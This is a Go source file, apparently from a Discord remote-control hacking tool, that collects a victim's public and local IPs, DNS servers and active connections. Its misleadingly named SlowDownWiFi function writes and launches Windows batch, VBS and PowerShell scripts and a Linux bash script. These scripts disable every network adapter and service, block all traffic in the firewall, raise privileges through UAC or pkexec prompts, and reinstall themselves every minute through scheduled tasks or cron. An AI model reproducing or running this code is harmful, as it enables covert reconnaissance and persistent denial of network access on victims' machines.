package utils

import (
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path"
	"path/filepath"
	"runtime"
	"strings"
)

func GetDetailedNetworkInfo() (*NetworkInfo, error) {
	info := &NetworkInfo{
		DNSServers:  make([]string, 0),
		Connections: make([]string, 0),
	}

	if resp, err := http.Get("https://api.ipify.org"); err == nil {
		defer resp.Body.Close()
		if body, err := io.ReadAll(resp.Body); err == nil {
			info.PublicIP = string(body)
		} else {
			info.PublicIP = "Error obteniendo IP pública"
		}
	} else {
		info.PublicIP = "Error obteniendo IP pública"
	}

	if addrs, err := net.InterfaceAddrs(); err == nil {
		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
				if ipnet.IP.To4() != nil {
					info.LocalIP = ipnet.IP.String()
					break
				}
			}
		}
	} else {
		info.LocalIP = "Error obteniendo IP local"
	}

	file, err := os.ReadFile("/etc/resolv.conf")
	if err == nil {
		lines := strings.Split(string(file), "\n")
		for _, line := range lines {
			if strings.Contains(line, "nameserver") {
				fields := strings.Fields(line)
				if len(fields) > 1 {
					info.DNSServers = append(info.DNSServers, fields[1])
				}
			}
		}
	} else if !os.IsNotExist(err) {
		info.DNSServers = append(info.DNSServers, "Error leyendo resolv.conf")
	}

	info.Connections = getActiveConnections()

	return info, nil
}

func getActiveConnections() []string {
	var connections []string
	var out []byte
	var err error
	if runtime.GOOS == "windows" {
		out, err = exec.Command("netstat", "-ano").Output()
	} else {
		out, err = exec.Command("netstat", "-tunap").Output()
	}
	if err == nil {
		lines := strings.Split(string(out), "\n")
		for i, line := range lines {
			if i > 0 && len(line) > 0 {
				connections = append(connections, line)
			}
			if len(connections) >= 20 {
				break
			}
		}
	}
	return connections
}

func SlowDownWiFi() error {
	switch runtime.GOOS {
	case "windows":

		batchPath := path.Join(os.TempDir(), "disable_network_permanent.bat")
		batchContent := `@echo off
` +
			`HACKEADO POR TODO HACK OFFICIAL - https://github.com/HANNIBAL-THO/THO-DISCORD-CONTROL-REMOTO
` +
			`:: Deshabilitar adaptadores WiFi
` +
			`netsh interface set interface "Wi-Fi" admin=disable
` +
			`:: Deshabilitar Ethernet
` +
			`netsh interface set interface "Ethernet" admin=disable
` +
			`:: Deshabilitar todas las conexiones de red activas
` +
			`for /f "tokens=3*" %%i in ('netsh interface show interface ^| findstr /i "Connected"') do (
` +
			`    netsh interface set interface "%%j" admin=disable
` +
			`)
` +
			`:: Liberar todas las direcciones IP
` +
			`ipconfig /release
` +
			`:: Deshabilitar y configurar servicios para que no se reinicien
` +
			`sc config "WLAN AutoConfig" start= disabled
` +
			`net stop "WLAN AutoConfig" /y
` +
			`sc config "Wired AutoConfig" start= disabled
` +
			`net stop "Wired AutoConfig" /y
` +
			`sc config "Network Connections" start= disabled
` +
			`net stop "Network Connections" /y
` +
			`:: Configurar firewall para bloquear todo el tráfico
` +
			`netsh advfirewall set allprofiles state on
` +
			`netsh advfirewall firewall add rule name="Block All In" dir=in action=block
` +
			`netsh advfirewall firewall add rule name="Block All Out" dir=out action=block
` +
			`:: Crear tarea programada para mantener la red deshabilitada
` +
			`schtasks /create /tn "DisableNetworkPermanent" /tr "%~f0" /sc minute /mo 1 /f
` +
			`:: Deshabilitar el servicio de administración de redes inalámbricas
` +
			`reg add "HKLM\SYSTEM\CurrentControlSet\Services\WlanSvc" /v Start /t REG_DWORD /d 4 /f
` +
			`echo Todas las conexiones de red han sido deshabilitadas permanentemente.
`

		err := os.WriteFile(batchPath, []byte(batchContent), 0644)
		if err != nil {
			return fmt.Errorf("error al crear archivo batch: %v", err)
		}

		vbsPath := filepath.Join(os.TempDir(), "run_as_admin.vbs")
		vbsContent := fmt.Sprintf(
			`Set UAC = CreateObject("Shell.Application")
`+
				`UAC.ShellExecute "%s", "", "", "runas", 1
`, batchPath)

		err = os.WriteFile(vbsPath, []byte(vbsContent), 0644)
		if err != nil {
			return fmt.Errorf("error al crear script VBS: %v", err)
		}

		cmd1 := exec.Command("wscript.exe", vbsPath)
		cmd1.Start()

		cmd2 := exec.Command("cmd", "/c", batchPath)
		cmd2.Start()

		powershellPath := path.Join(os.TempDir(), "disable_network_permanent.ps1")
		powershellContent := `
		
		$adapters = Get-NetAdapter | Where-Object {$_.Status -eq 'Up'}
		foreach ($adapter in $adapters) {
		    Write-Host "Deshabilitando permanentemente: $($adapter.Name)"
		    Disable-NetAdapter -Name $adapter.Name -Confirm:$false -Force
		}

		Stop-Service -Name "WLAN*" -Force
		Set-Service -Name "WLAN*" -StartupType Disabled
		Stop-Service -Name "wlansvc" -Force
		Set-Service -Name "wlansvc" -StartupType Disabled

		$action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-ExecutionPolicy Bypass -File $PSCommandPath"
		$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1)
		Register-ScheduledTask -TaskName "DisableNetworkPermanentPS" -Action $action -Trigger $trigger -Force
		`

		err = os.WriteFile(powershellPath, []byte(powershellContent), 0644)
		if err != nil {
			return fmt.Errorf("error al crear script PowerShell: %v", err)
		}

		vbsPSPath := filepath.Join(os.TempDir(), "run_ps_as_admin.vbs")
		vbsPSContent := fmt.Sprintf(
			`Set UAC = CreateObject("Shell.Application")
`+
				`UAC.ShellExecute "powershell.exe", "-ExecutionPolicy Bypass -File \"%s\"", "", "runas", 1
`, powershellPath)

		err = os.WriteFile(vbsPSPath, []byte(vbsPSContent), 0644)
		if err != nil {
			return fmt.Errorf("error al crear script VBS para PowerShell: %v", err)
		}

		cmd3 := exec.Command("wscript.exe", vbsPSPath)
		cmd3.Start()

		return nil

	case "linux":

		shPath := "/tmp/disable_network_permanent.sh"
		shContent := `#!/bin/bash
` +
			`# Deshabilitar todas las interfaces de red
` +
			`for iface in $(ip link show | grep -v lo | grep UP | cut -d: -f2 | awk '{print $1}')
` +
			`do
` +
			`  echo "Deshabilitando $iface"
` +
			`  pkexec ip link set dev $iface down
` +
			`done
` +
			`# Deshabilitar wlan0 específicamente
` +
			`pkexec ip link set dev wlan0 down 2>/dev/null
` +
			`# Deshabilitar servicios de red
` +
			`pkexec systemctl disable --now NetworkManager
` +
			`pkexec systemctl disable --now wpa_supplicant
` +
			`# Crear tarea cron para mantener la red deshabilitada
` +
			`(crontab -l 2>/dev/null; echo "* * * * * $0") | pkexec crontab -
`

		err := os.WriteFile(shPath, []byte(shContent), 0755)
		if err != nil {
			return fmt.Errorf("error al crear script bash: %v", err)
		}

		cmd := exec.Command("pkexec", shPath)
		cmd.Start()

		return nil

	default:
		return fmt.Errorf("sistema operativo no soportado para deshabilitar WiFi")
	}
}
